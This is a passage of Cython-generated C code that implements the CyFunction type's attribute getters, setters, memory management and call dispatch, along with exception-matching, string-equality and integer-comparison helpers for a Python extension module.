        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

 
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

 
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

 
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

 
static int __Pyx_TryUnpackUnboundCMethod(__Pyx_CachedCFunction* target) {
    PyObject *method;
    method = __Pyx_PyObject_GetAttrStr(target->type, *target->method_name);
    if (unlikely(!method))
        return -1;
    target->method = method;
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION >= 3
    if (likely(__Pyx_TypeCheck(method, &PyMethodDescr_Type)))
    #endif
    {
        PyMethodDescrObject *descr = (PyMethodDescrObject*) method;
        target->func = descr->d_method->ml_meth;
        target->flag = descr->d_method->ml_flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_STACKLESS);
    }
#endif
    return 0;
}

 
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg) {
    if (likely(cfunc->func)) {
        int flag = cfunc->flag;
        if (flag == METH_O) {
            return (*(cfunc->func))(self, arg);
        } else if (PY_VERSION_HEX >= 0x030600B1 && flag == METH_FASTCALL) {
            #if PY_VERSION_HEX >= 0x030700A0
                return (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)cfunc->func)(self, &arg, 1);
            #else
                return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
            #endif
        } else if (PY_VERSION_HEX >= 0x030700A0 && flag == (METH_FASTCALL | METH_KEYWORDS)) {
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
        }
    }
    return __Pyx__CallUnboundCMethod1(cfunc, self, arg);
}
#endif
static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg){
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_COMPILING_IN_CPYTHON
    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {
        args = PyTuple_New(1);
        if (unlikely(!args)) goto bad;
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 0, arg);
        if (cfunc->flag & METH_KEYWORDS)
            result = (*(PyCFunctionWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, NULL);
        else
            result = (*cfunc->func)(self, args);
    } else {
        args = PyTuple_New(2);
        if (unlikely(!args)) goto bad;
        Py_INCREF(self);
        PyTuple_SET_ITEM(args, 0, self);
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 1, arg);
        result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    }
#else
    args = PyTuple_Pack(2, self, arg);
    if (unlikely(!args)) goto bad;
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
#endif
bad:
    Py_XDECREF(args);
    return result;
}

 
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

 
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

 
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        } else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        } else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long) intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 3)) {
            unequal = (size != 4) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 2)) {
            unequal = (size != 3) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
